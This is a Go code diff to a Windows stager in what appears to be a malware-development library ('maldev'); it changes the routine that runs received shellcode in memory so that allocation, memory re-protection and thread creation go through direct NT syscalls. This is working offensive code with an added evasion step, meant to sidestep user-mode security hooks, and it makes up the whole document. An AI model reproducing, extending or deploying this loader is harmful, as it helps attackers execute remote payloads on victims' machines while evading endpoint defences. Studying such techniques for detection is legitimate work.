@@ -8,6 +8,7 @@ import (
 	"unsafe"
 
 	"github.com/oioio-space/maldev/win/api"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 	"golang.org/x/sys/windows"
 )
 
@@ -35,46 +36,110 @@ func (s *Stager) stageWindows() error {
 		return fmt.Errorf("received payload too small (%d bytes), invalid stage", len(shellcode))
 	}
 
-	return executeInMemory(shellcode)
+	// Type-assert the Caller from Config (stored as any for cross-platform compat).
+	var caller *wsyscall.Caller
+	if s.config.Caller != nil {
+		var ok bool
+		caller, ok = s.config.Caller.(*wsyscall.Caller)
+		if !ok {
+			return fmt.Errorf("Config.Caller must be *wsyscall.Caller, got %T", s.config.Caller)
+		}
+	}
+
+	return executeInMemory(shellcode, caller)
 }
 
 // executeInMemory allocates RW memory, copies shellcode, re-protects as
 // RX, then executes via CreateThread. The two-step allocation avoids
 // mapping memory as simultaneously writable and executable (RWX).
-func executeInMemory(shellcode []byte) error {
+//
+// When caller is non-nil, security-sensitive calls (VirtualAlloc, VirtualProtect,
+// CreateThread) are routed through NT syscalls via the Caller. Pass nil for
+// standard WinAPI behavior.
+func executeInMemory(shellcode []byte, caller *wsyscall.Caller) error {
 	size := uintptr(len(shellcode))
 
-	addr, err := windows.VirtualAlloc(
-		0,
-		size,
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_READWRITE,
-	)
-	if err != nil {
-		return fmt.Errorf("VirtualAlloc failed: %w", err)
+	// 1. Allocate RW memory
+	var addr uintptr
+	if caller != nil {
+		currentProcess := ^uintptr(0)
+		regionSize := size
+		r, err := caller.Call("NtAllocateVirtualMemory",
+			currentProcess,
+			uintptr(unsafe.Pointer(&addr)),
+			0,
+			uintptr(unsafe.Pointer(&regionSize)),
+			windows.MEM_COMMIT|windows.MEM_RESERVE,
+			uintptr(windows.PAGE_READWRITE),
+		)
+		if r != 0 {
+			return fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X: %w", uint32(r), err)
+		}
+	} else {
+		var err error
+		addr, err = windows.VirtualAlloc(
+			0, size,
+			windows.MEM_COMMIT|windows.MEM_RESERVE,
+			windows.PAGE_READWRITE,
+		)
+		if err != nil {
+			return fmt.Errorf("VirtualAlloc failed: %w", err)
+		}
 	}
 
+	// 2. Copy shellcode (RtlMoveMemory is a memcpy — not security-sensitive)
 	_, _, _ = api.ProcRtlMoveMemory.Call(
 		addr,
 		uintptr(unsafe.Pointer(&shellcode[0])),
 		size,
 	)
 
+	// 3. Re-protect as executable
 	var oldProtect uint32
-	if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
-		return fmt.Errorf("VirtualProtect failed: %w", err)
+	if caller != nil {
+		currentProcess := ^uintptr(0)
+		protectAddr := addr
+		protectSize := size
+		r, err := caller.Call("NtProtectVirtualMemory",
+			currentProcess,
+			uintptr(unsafe.Pointer(&protectAddr)),
+			uintptr(unsafe.Pointer(&protectSize)),
+			uintptr(windows.PAGE_EXECUTE_READ),
+			uintptr(unsafe.Pointer(&oldProtect)),
+		)
+		if r != 0 {
+			return fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X: %w", uint32(r), err)
+		}
+	} else {
+		if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
+			return fmt.Errorf("VirtualProtect failed: %w", err)
+		}
 	}
 
-	thread, _, err := api.ProcCreateThread.Call(
-		0,
-		0,
-		addr,
-		0,
-		0,
-		0,
-	)
-	if thread == 0 {
-		return fmt.Errorf("CreateThread failed: %w", err)
+	// 4. Create thread to execute
+	var thread uintptr
+	if caller != nil {
+		currentProcess := ^uintptr(0)
+		r, err := caller.Call("NtCreateThreadEx",
+			uintptr(unsafe.Pointer(&thread)),
+			uintptr(api.ThreadAllAccess),
+			0,
+			currentProcess,
+			addr,
+			0,
+			0, 0, 0, 0, 0,
+		)
+		if r != 0 {
+			return fmt.Errorf("NtCreateThreadEx failed: NTSTATUS 0x%X: %w", uint32(r), err)
+		}
+	} else {
+		var err error
+		thread, _, err = api.ProcCreateThread.Call(
+			0, 0, addr, 0, 0, 0,
+		)
+		if thread == 0 {
+			return fmt.Errorf("CreateThread failed: %w", err)
+		}
 	}
 
 	// NOTE: WaitForSingleObject(INFINITE) blocks until the thread exits.
